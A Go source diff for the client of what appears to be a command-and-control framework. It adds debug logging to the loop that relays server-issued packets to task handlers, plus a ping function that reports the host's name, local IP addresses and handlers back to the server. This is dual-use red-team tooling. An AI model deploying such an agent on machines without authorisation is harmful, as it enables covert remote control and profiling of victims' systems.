@@ -4,6 +4,7 @@ import (
 	"errors"
 
 	"github.com/dobin/antnium/model"
+	log "github.com/sirupsen/logrus"
 )
 
 var ErrNoPacketsFound = errors.New("Server did not return any packets")
@@ -37,19 +38,45 @@ func (s *Client) Start() {
 	// start Upstream thread
 	go s.upstream.start()
 
+	//err := s.sendPing()
+	//if err != nil {
+	// Handle server not reachable
+	//}
+
 	var p model.Packet
 	for {
 		// Block until we receive a packet from server
 		p = <-s.upstream.channel
+		log.Info("A")
 
 		// Select appropriate downstream channel
 		c := s.downstreamManager.GetFor(p)
+		log.Info("B")
 		// Send it to the downstream
 		c <- p
+		log.Info("C")
 		// Receive answer
 		p = <-c
 
+		log.Info("D")
 		// Send answer back to server
 		s.upstream.channel <- p
 	}
+}
+
+func (s *Client) sendPing() error {
+	arguments := make(model.PacketArgument)
+	response := make(model.PacketResponse)
+
+	response["hostname"] = s.Config.Hostname
+	model.AddArrayToResponse("localIp", s.Config.LocalIps, response)
+	model.AddArrayToResponse("downstreams", s.downstreamManager.GetList(), response)
+
+	packet := model.NewPacket("ping", s.Config.ComputerId, "0", arguments, response)
+
+	//s.sendPacket(packet)
+	s.upstream.channel <- packet
+	//_ = <-s.upstream.channel
+
+	return nil
 }
